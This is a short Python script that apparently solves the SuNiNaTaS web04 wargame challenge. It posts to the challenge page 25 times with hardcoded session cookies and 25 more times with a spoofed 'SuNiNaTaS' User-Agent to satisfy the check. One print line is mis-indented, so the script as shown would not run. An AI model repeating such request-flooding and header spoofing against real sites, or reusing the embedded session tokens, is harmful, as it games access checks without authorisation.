import requests as req

URL = "http://suninatas.com/challenge/web04/web04_ck.asp"

cookies = {"ASPSESSIONIDCQCAQARC":"IBAIEAKBONBABMLEAKMEAJBF", "ASP.NET_SessionId":"r0t5uuobdpqluvd4k112cs2y", "_gid":"GA1.2.156625606.1605051663", "_ga":"GA1.2.416738295.1605051663"}

headers = req.utils.default_headers()

headers.update({'User-Agent':'SuNiNaTaS', })


for a in range(25):
   response = req.post(URL, cookies=cookies)
    print(response.status_code)
    print(a)

for a in range(25):
    response = req.post(URL, cookies=cookies, headers=headers)
    print(response.status_code)
    print(a)
